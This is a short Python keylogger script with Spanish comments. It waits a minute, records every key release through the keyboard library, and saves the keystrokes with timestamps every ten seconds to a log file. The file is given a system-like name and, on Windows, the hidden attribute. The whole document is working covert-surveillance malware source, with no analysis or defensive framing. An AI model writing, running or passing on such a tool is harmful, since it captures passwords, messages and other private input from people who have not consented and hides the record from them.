import keyboard
from threading import Timer
from datetime import datetime
import os
import sys
import time
time.sleep(60)  # Espera 1 minuto antes de iniciar
# Configuración
LOG_FILE = ".system_log.txt"  # Nombre del archivo de logs y archivo oculto
SEND_INTERVAL = 10  # Intervalo de guardado (en segundos)

# Variable para almacenar las teclas presionadas
log = ""

# Asegúrate de que el archivo exista
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("")  # Crea un archivo vacío

def callback(event):
    global log
    name = event.name
    print(f"Tecla presionada: {name}")  # Depuración: Muestra la tecla presionada
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = f"[{name.upper()}]"
    log += name

def save_log():
    global log
    if log:
        try:
            print(f"Guardando log: {log}")  # Depuración: Muestra lo que se va a guardar
            with open(LOG_FILE, "a") as f:
                f.write(f"[{datetime.now()}] {log}\n")
            log = ""  # Limpiar el log después de guardarlo
        except Exception as e:
            print(f"Error al guardar el log: {e}")
    Timer(SEND_INTERVAL, save_log).start()  # Programar el próximo guardado

# Ocultar el archivo de logs en Windows
if sys.platform == "win32":
    import ctypes
    try:
        ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)  # 2 = Archivo oculto
    except Exception as e:
        print(f"No se pudo ocultar el archivo: {e}")

# Registrar las pulsaciones de teclas
keyboard.on_release(callback)

# Iniciar el guardado de logs
save_log()

# Mantener el programa en ejecución
print("Keylogger en ejecución... Presiona Ctrl+C para detener.")
keyboard.wait()